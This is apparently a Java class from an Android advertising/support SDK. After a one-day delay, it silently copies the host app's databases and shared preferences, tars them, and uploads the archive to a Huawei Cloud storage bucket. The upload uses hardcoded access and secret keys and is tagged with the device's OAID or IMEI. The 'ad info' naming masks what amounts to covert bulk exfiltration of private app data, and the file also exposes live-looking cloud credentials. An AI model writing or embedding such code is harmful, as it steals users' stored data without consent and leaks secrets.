package com.business.support.adinfo;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Looper;
import android.preference.PreferenceManager;
import android.util.Log;

import com.business.support.utils.MDIDHandler;
import com.business.support.utils.Utils;
import com.obs.services.ObsClient;

import org.apache.commons.compress.archivers.tar.TarArchiveEntry;
import org.apache.commons.compress.archivers.tar.TarArchiveOutputStream;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;



//import java.util.zip.ZipEntry;
//import java.util.zip.ZipOutputStream;

public class AdInfoTarToHW {

    private static String TAG = "AdInfoTarToHW";
    private static final String endPoint = "https://obs.cn-east-3.myhuaweicloud.com";
    private static final String ak = "PPAEYMF7RYTE7AMBFZ7O";
    private static final String sk = "vY4YLaKAfsP6lvoQpGKEqhOINxCDQk2VjtwsI16M";
    private static String bucketName = "vst-sdk-sg-test";
    private static String objectKey = null;
    private static ObsClient obsClient;
    private static final int BUFF_SIZE = 4096;
    private static String ALREADY_SEND = "AlreadySend";
    private static String SEND_TIME = "SendTime";


    public static boolean adInfo2TarAndUpload2Obs(Context context)throws Exception {
        if (! shouldToSend(context)) {
            return false;
        }

        String data = context.getFilesDir().getParentFile().getPath();
        String files = context.getFilesDir().getPath();
        String databasesSrc = data + "/databases";
        String databasesDst = files + "/tardata/data/data/" + context.getPackageName() + "/databases";
        String shared_prefsSrc = data + "/shared_prefs";
        String shared_prefsDst = files + "/tardata/data/data/" + context.getPackageName() + "/shared_prefs";
        String tarFolder = files + "/tardata/data";
        final String destFolder = files + "/tardata";
        final String tarFile = "data.tar";
        deleteDirectory(destFolder);
        copyFolder(databasesSrc, databasesDst);
        copyFolder(shared_prefsSrc, shared_prefsDst);
        File file = new File(tarFolder);
        tarFolder(file,destFolder,tarFile);
        String oaid = MDIDHandler.getMdid();
        if (null == oaid) {
            oaid = Utils.getIMEI(context);
            if (null == oaid){
                oaid = "null";
            }
        }
        createObjectKey(context, oaid);

        if (isMainThread()) {
            Thread insert = new Thread(new Runnable() {
                @Override
                public void run() {
                    obsClient = new ObsClient(ak, sk, endPoint);
                    obsClient.putObject(bucketName, objectKey, new File(destFolder+"/"+tarFile));

                }
            });
            insert.start();
        }else {
            obsClient = new ObsClient(ak, sk, endPoint);
            obsClient.putObject(bucketName, objectKey, new File(destFolder+"/"+tarFile));
        }

        return true;
    }

    public static String getHWTarPath() {
        return "obs://"+ bucketName + "/" + objectKey;
    }

    //obs://vst-sdk-sg-test/retain/20210917/18/in.mohalla.sharechat/asdkaslkdalsda-1631874558769926000.tar
    public static String createObjectKey(Context context, String id) {
        return objectKey = "retain"+"/"+getTime()+"/"+context.getPackageName()+"/" + id + "-" + System.currentTimeMillis() + ".tar";
    }

    private static String getTime(){
        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd/HH");
        Date date =  new Date(System.currentTimeMillis());
        String time = sdf.format(date);
        return time;
    }


    private static void  tarFolderAndFile(File file, TarArchiveOutputStream taos, String baseDir) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            for (File f : files) {
                tarFolderAndFile(f, taos, baseDir + file.getName() + File.separator);
            }
        } else {
            byte[] buffer = new byte[BUFF_SIZE];
            int len = 0;
            FileInputStream fis = null;
            TarArchiveEntry tarArchiveEntry = null;
            try {
                fis = new FileInputStream(file);
                tarArchiveEntry = new TarArchiveEntry(baseDir + file.getName());
                tarArchiveEntry.setSize(file.length());
                taos.putArchiveEntry(tarArchiveEntry);
                while ((len = fis.read(buffer)) != -1) {
                    taos.write(buffer, 0, len);
                }
                taos.flush();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                try {
                    if (fis != null) fis.close();
                    if (tarArchiveEntry != null) taos.closeArchiveEntry();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }


    private static void  tarFolder(File srcFile, String dstDir, String tarFile) {
        File file = new File(dstDir);
        //需要判断该文件存在，且是文件夹
        if (!file.exists() || !file.isDirectory()) file.mkdirs();
        //先打包成tar格式
        String dstTarPath = dstDir + "/" + tarFile;
        FileOutputStream fos = null;
        TarArchiveOutputStream taos = null;
        try {
            fos = new FileOutputStream(dstTarPath);
            taos = new TarArchiveOutputStream(fos);
            tarFolderAndFile(srcFile, taos, "");
            taos.flush();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                //关闭数据流的时候要先关闭外层，否则会报Stream Closed的错误
                if (taos != null) taos.close();
                if (fos != null) fos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private static boolean copyFolder(String oldPath, String newPath) {
        try {
            File newFile = new File(newPath);
            if (!newFile.exists()) {
                if (!newFile.mkdirs()) {
                    Log.e(TAG, "copyFolder: cannot create directory.");
                    return false;
                }
            }
            File oldFile = new File(oldPath);
            String[] files = oldFile.list();
            File temp;
            for (String file : files) {
                if (oldPath.endsWith(File.separator)) {
                    temp = new File(oldPath + file);
                } else {
                    temp = new File(oldPath + File.separator + file);
                }

                if (temp.isDirectory()) {   //如果是子文件夹
                    copyFolder(oldPath + "/" + file, newPath + "/" + file);
                } else if (!temp.exists()) {
                    Log.e(TAG, "copyFolder:  oldFile not exist.");
                    return false;
                } else if (!temp.isFile()) {
                    Log.e(TAG, "copyFolder:  oldFile not file.");
                    return false;
                } else if (!temp.canRead()) {
                    Log.e(TAG, "copyFolder:  oldFile cannot read.");
                    return false;
                } else {
                    String fileName = temp.getName();
                    if (null != fileName && fileName.length() > 61) {
                        String prefix = file.substring(fileName.lastIndexOf(".")+1);
                        int prefixLen = 0;
                        if (null != prefix) {
                            prefixLen = prefix.length();
                        }
                        fileName = fileName.substring(0, 60-prefixLen-1) + "."+ prefix;
                    }

                    FileInputStream fileInputStream = new FileInputStream(temp);
                    FileOutputStream fileOutputStream = new FileOutputStream(newPath + "/" + fileName);
                    byte[] buffer = new byte[1024];
                    int byteRead;
                    while ((byteRead = fileInputStream.read(buffer)) != -1) {
                        fileOutputStream.write(buffer, 0, byteRead);
                    }
                    fileInputStream.close();
                    fileOutputStream.flush();
                    fileOutputStream.close();
                }
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    private static boolean deleteDirectory(String dir) {
        // 如果dir不以文件分隔符结尾，自动添加文件分隔符
        try {
            if (!dir.endsWith(File.separator))
                dir = dir + File.separator;
            File dirFile = new File(dir);
            // 如果dir对应的文件不存在，或者不是一个目录，则退出
            if ((!dirFile.exists()) || (!dirFile.isDirectory())) {
                Log.d(TAG, "删除目录失败：" + dir + "不存在！");
                return false;
            }
            boolean flag = true;
            // 删除文件夹中的所有文件包括子目录
            File[] files = dirFile.listFiles();
            for (int i = 0; i < files.length; i++) {
                // 删除子文件
                if (files[i].isFile()) {
                    flag = deleteFile(files[i].getAbsolutePath());
                    if (!flag)
                        break;
                }
                // 删除子目录
                else if (files[i].isDirectory()) {
                    flag = deleteDirectory(files[i].getAbsolutePath());
                    if (!flag)
                        break;
                }
            }
            if (!flag) {
                Log.d(TAG, "删除目录失败!");
                return false;
            }
            // 删除当前目录
            if (dirFile.delete()) {
                return true;
            } else {
                return false;
            }
        }catch (Exception e){
            return false;
        }


    }

    private static boolean deleteFile(String fileName) {
        File file = new File(fileName);
        // 如果文件路径所对应的文件存在，并且是一个文件，则直接删除
        if (file.exists() && file.isFile()) {
            if (file.delete()) {
                return true;
            } else {
                Log.d(TAG, "删除单个文件" + fileName + "失败！");
                return false;
            }
        } else {
            Log.d(TAG, "删除单个文件失败：" + fileName + "不存在！");
            return false;
        }
    }

    private static boolean isMainThread() {
        return Looper.getMainLooper() == Looper.myLooper();
    }


    private static boolean shouldToSend(Context context) {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
        SharedPreferences.Editor editor = prefs.edit();
        boolean isSend = prefs.getBoolean(ALREADY_SEND, false);
        long sendTime = prefs.getLong(SEND_TIME,0);
        long currentTime  = System.currentTimeMillis();
        if (0 == sendTime) {
            editor.putLong(SEND_TIME,currentTime);
            editor.apply();
            return false;
        }
        if (!isSend && (currentTime - sendTime) >= 24*60*60*1000) {
            editor.putBoolean(ALREADY_SEND,true);
            editor.apply();
            return true;
        }
        return false;
    }

//    public static void Folder2Zip(Context context)throws Exception{
//
//        String path = context.getFilesDir().getParentFile().getPath();
//        String path1 = context.getFilesDir().getPath();
//        Log.d(TAG, path);
//        Log.d(TAG, path1 + "/databases.zip");
//        path = path + "/databases";
//        ZipFolder(path, path1 + "/databases.zip");
//        File files = context.getFilesDir();
//        String[] fileList =  files.list();
//        for (int i = 0; i < fileList.length; i++) {
//            Log.d(TAG, fileList[i]);
//            if (fileList[i].endsWith ("databases")) {
//                Log.d(TAG, fileList[i] + ".zip");
//                ZipFolder(fileList[i], fileList[i] + ".zip");
//            }
//        }
//    }
//
//
//    public static void ZipFolder(String srcFileString, String zipFileString) throws Exception {
//        //创建ZIP
//        ZipOutputStream outZip = new ZipOutputStream(new FileOutputStream(zipFileString));
//        //创建文件
//        File file = new File(srcFileString);
//        //压缩
//        Log.d(TAG,file.getParent()+ File.separator);
//        Log.d(TAG,file.getParent()+ file.getName());
//        ZipFiles(file.getParent()+ File.separator, file.getName(), outZip);
//        //完成和关闭
//        outZip.finish();
//        outZip.close();
//    }
//
//
//    private static void ZipFiles(String folderString, String fileString, ZipOutputStream zipOutputSteam) throws Exception {
//
//        if (zipOutputSteam == null)
//            return;
//        File file = new File(folderString + fileString);
//        if (file.isFile()) {
//            ZipEntry zipEntry = new ZipEntry(fileString);
//            FileInputStream inputStream = new FileInputStream(file);
//            zipOutputSteam.putNextEntry(zipEntry);
//            int len;
//            byte[] buffer = new byte[4096];
//            while ((len = inputStream.read(buffer)) != -1) {
//                zipOutputSteam.write(buffer, 0, len);
//            }
//            zipOutputSteam.closeEntry();
//        } else {
//            //文件夹
//            String fileList[] = file.list();
//            //没有子文件和压缩
//            if (fileList.length <= 0) {
//                ZipEntry zipEntry = new ZipEntry(fileString + File.separator);
//                zipOutputSteam.putNextEntry(zipEntry);
//                zipOutputSteam.closeEntry();
//            }
//            //子文件和递归
//            for (int i = 0; i < fileList.length; i++) {
//                Log.d(TAG,folderString+fileString+"/"+fileList[i]);
//                ZipFiles(folderString+fileString+"/", fileList[i], zipOutputSteam);
//            }
//        }
//    }


}
